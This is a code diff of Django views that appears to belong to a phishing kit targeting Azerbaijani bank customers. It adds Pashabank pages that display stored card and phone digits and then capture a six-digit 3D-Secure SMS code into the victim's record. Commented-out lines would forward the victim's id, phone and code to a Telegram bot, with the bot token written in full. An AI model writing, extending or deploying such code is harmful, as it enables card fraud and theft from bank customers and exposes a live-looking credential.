@@ -235,6 +235,20 @@ def contact_approve_unibank(request, pk):
     return JsonResponse({'success': True})
 
 
+@ensure_csrf_cookie
+def contact_approve_pashabank(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    
+    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
+    contact.bankname = "pashabank"
+    contact.save()
+
+    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
+    # Örneğin: return redirect('azercell')
+
+    return JsonResponse({'success': True})
+
+
 def approval_page(request, pk):
     contact = get_object_or_404(ContactModel, pk=pk)
     context = {'contact': contact}
@@ -299,7 +313,6 @@ def dseckapital(request):
         input3 = request.POST.get("input3")
         input4 = request.POST.get("input4")
         concatenated = input1 + input2+input3+input4
-        print(concatenated)
         last_contact = ContactModel.objects.latest('created_at')
         last_contact.sms=concatenated
         last_contact.save()
@@ -350,7 +363,42 @@ def unibank3d(request):
     last_contact = ContactModel.objects.latest('created_at')
     last_contact.sms=sms
     last_contact.save()
-    print(sms)
     #telegram
     # response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
+    return render( request,'pages/loading.html' )
+
+
+
+@ensure_csrf_cookie
+def pashabank(request):
+    last_contact = ContactModel.objects.latest('created_at')
+    number = str(last_contact.phone)
+
+    context = {
+        'number': number[-4:],
+        'amount': last_contact.amount,
+        'cc': last_contact.cc[-4:],
+    }
+    
+    return render( request,'pages/pasha.html',context )
+
+
+@ensure_csrf_cookie
+def pashabank3d(request):
+    if request.method == "POST":
+        input1 = request.POST.get("input1")
+        input2 = request.POST.get("input2")
+        input3 = request.POST.get("input3")
+        input4 = request.POST.get("input4")
+        input5 = request.POST.get("input5")
+        input6 = request.POST.get("input6")
+        concatenated = input1+input2 +input3+input4+input5+input6
+        last_contact = ContactModel.objects.latest('created_at')
+        last_contact.sms=concatenated
+        last_contact.save()
+        #telegram
+        # response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
+        return render( request,'pages/loading.html' )
+    
+    
     return render( request,'pages/loading.html' )
